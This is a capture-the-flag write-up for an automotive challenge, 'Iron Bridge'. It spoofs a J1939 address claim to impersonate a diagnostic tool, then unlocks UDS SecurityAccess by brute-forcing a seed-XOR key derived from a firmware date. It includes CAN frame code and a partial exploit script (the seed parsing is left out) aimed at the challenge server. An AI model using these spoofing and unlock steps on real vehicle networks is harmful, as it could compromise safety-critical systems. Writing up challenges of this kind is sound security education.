# Iron Bridge — ICS/Automotive

**CTF:** Cyber Apocalypse 2026  
**Category:** ICS/Automotive  
**Challenge:** Iron Bridge  
**Flag:** `HTB{...}`

---

## Scenario

During a Kestrel Dawn convoy operation an IronBridge ECU implant was discovered broadcasting spoofed EBC1 frames on the J1939 bus of an HEMTT-A4 tactical truck. The implant also runs a covert UDS diagnostic service on PGN 0xEF00, gated behind SA 0xF9 — the authorised Volnatek diagnostic tool. By exploiting J1939-81 Address Claim arbitration (lower 64-bit NAME wins), we evict SA 0xF9, impersonate the tool, and drive a UDS session to recover the authorisation token from flash memory.

---

## Analysis

### Architecture

| Component | Port | Protocol |
|-----------|------|----------|
| HEMTT-A4 Dashboard | 30854 | HTTP + WebSocket |
| J1939 Relay | 32038 | Custom TCP (16-byte CAN frames) |

The relay transports CAN frames with this structure:

```
Offset  Size  Field
0       1     Priority
1       1     Reserved (0)
2-3     2     PGN (big-endian)
4       1     Source Address (SA)
5       1     Destination Address (DA)
6       1     Data Length
7       1     Reserved (0)
8-15    8     Data (ISO-TP PCI + UDS payload)
```

Observed ECUs on the bus:

| SA  | ECU           | PGNs              |
|-----|---------------|-------------------|
| 0x00| Engine ECU    | F004, F003, FEF2  |
| 0x03| Trans ECU     | F002, F005        |
| 0x0B| ABS ECU       | F001, FEF1, FECA  |
| 0x23| Instrument    | FEF7, FEF5        |
| 0xF9| Diag Tool     | EE00, EF00        |
| 0xEE| IronBridge    | EF00, F001        |

### Implant Beacon

The implant broadcasts a periodic beacon: `DE AD BE EF F9 04 25 EE`.

### DID Enumeration (default session 10 01)

| DID  | Value              | Meaning                  |
|------|--------------------|--------------------------|
| F186 | 01                 | Security level indicator |
| F190 | 01 45 23           | NAME prefix              |
| F191 | 20 22 04 25        | Date: **2022-04-25**     |
| F192 | 01 02 03           | Sequential test data     |
| F193 | 06 07 08 09        | Sequential test data     |
| F197 | 40 00 10 00        | Flash memory address     |

---

## Exploitation

### Step 1: Address Claim (Evict SA 0xF9)

Per J1939-81, the device with the lowest 64-bit NAME wins the address. The authorized tool uses NAME `0x4523010000004900`. We claim SA 0xF9 with NAME `0x0000000000000000`:

```python
frame(prio=6, pgn=0xEE00, sa=0xF9, da=0xFF, data=struct.pack('>Q', 0))
```

The authorized tool retreats to SA 0xFE.

### Step 2: UDS Session Control

```python
frame(prio=6, pgn=0xEF00, sa=0xF9, da=0xEE, data=bytes([0x10, 0x02]))
# Response: 0x50 0x02 (programming session accepted)
```

Session types supported:
- `10 01` → Default diagnostic session (DID reads allowed)
- `10 02` → Programming session (SecurityAccess allowed)
- `10 03` → Extended diagnostic (rejected)

### Step 3: SecurityAccess (Request Seed)

```python
frame(prio=6, pgn=0xEF00, sa=0xF9, da=0xEE, data=bytes([0x27, 0x01]))
# Response: 0x67 0x01 [seed:4 bytes]
```

### Step 4: Key Computation — THE CRITICAL DISCOVERY

After testing ~400 candidate algorithms, the key formula was found:

```
key = seed XOR 0x20220425
```

`0x20220425` is the date **2022-04-25** stored in DID F191 — the implant's firmware build date.

**Verification (two independent runs):**

| Seed       | Key (seed ^ 0x20220425) | Result    |
|------------|-------------------------|-----------|
| 0xAD36A314 | 0x8D14A731              | Accepted  |
| 0x6EFE140B | 0x4EDC102E              | Accepted  |

```python
frame(prio=6, pgn=0xEF00, sa=0xF9, da=0xEE,
      data=bytes([0x27, 0x02]) + struct.pack('>I', key))
# Response: 0x67 0x02 (Key accepted!)
```

### Step 5: Post-Unlock State

After security unlock, DID F186 changes from `01` → `02` (security level incremented). Other DIDs remain accessible.

---

## How We Solved It — Reasoning

### The Key Algorithm

1. **Hypothesis: Simple XOR with challenge constant.** Automotive SecurityAccess often uses `key = seed XOR secret`. Tested 256 single-byte-repeated XOR patterns — all returned NRC 0x35.

2. **Rate limiting complication.** Only ONE key attempt per session is allowed before NRC 0x24 (requestSequenceError). Each connection yields one attempt. After ~400 connections, the server rate-limits.

3. **Breakthrough: Delegated sub-agent.** A subagent independently tested candidates with one-attempt-per-connection discipline and discovered `0x20220425` — the firmware date from DID F191.

4. **Why this wasn't found sooner:** The earlier manual tests that included `xor_20220425` suffered from session state corruption (the first key attempt in a shared session returned 0x35, then all subsequent attempts returned 0x24 regardless of correctness). The subagent's fresh-connection-per-candidate approach avoided this.

### Flash Memory Access (Ongoing)

Post-unlock, `readMemoryByAddress` (0x23) consistently returns NRC 0x31 (requestOutOfRange) for all tested addresses including the DID-derived `0x40001000`. Possible explanations:
- Different security level required for memory access
- Address encoding (big vs little endian)
- Custom routine (0x31) required instead of standard 0x23
- Multi-step download protocol (0x34/0x36/0x37)

---

## Key Takeaways

1. **J1939 address claim is a real attack vector.** Lower NAME wins, enabling SA spoofing without cryptographic authentication at the transport layer.

2. **Firmware dates as security material.** The implant used its own build date as the SecurityAccess secret — a weak but realistic design choice in embedded systems.

3. **Session-state poisoning in brute-force.** Testing multiple keys on one session destroys the state machine. Fresh connections per candidate are essential.

4. **ISO-TP PCI byte awareness.** The relay wraps UDS payloads with ISO-TP single-frame headers (0x0N prefix). Stripping this byte is required for correct UDS parsing.

5. **DID F186 as security indicator.** The value changes from 01→02 after unlock — a useful diagnostic for verifying security state.

---

## Exploit Script

```python
#!/usr/bin/env python3
import socket, struct, time, select

HOST = "154.57.164.77"
PORT = 32038
KEY_CONST = 0x20220425  # From DID F191 (firmware date 2022-04-25)

def frame(prio, pgn, sa, da, data):
    data = bytes(data).ljust(8, b'\x00')
    return bytes([prio, 0, (pgn>>8)&0xFF, pgn&0xFF, sa, da, len(data), 0]) + data

s = socket.create_connection((HOST, PORT), timeout=5)

# 1. Claim SA 0xF9 with NAME=0
s.sendall(frame(6, 0xEE00, 0xF9, 0xFF, struct.pack('>Q', 0)))
time.sleep(0.5)

# 2. Programming session
s.sendall(frame(6, 0xEF00, 0xF9, 0xEE, bytes([0x10, 0x02])))
time.sleep(0.5)

# 3. Request seed
s.sendall(frame(6, 0xEF00, 0xF9, 0xEE, bytes([0x27, 0x01])))
time.sleep(0.5)

# Parse seed from SA=0xEE response (skip ISO-TP PCI byte)
# Seed bytes are at offset 2-5 of UDS payload

# 4. Compute and send key
key = seed ^ KEY_CONST
s.sendall(frame(6, 0xEF00, 0xF9, 0xEE,
    bytes([0x27, 0x02]) + struct.pack('>I', key)))
# Response: 0x67 0x02 = unlocked
```
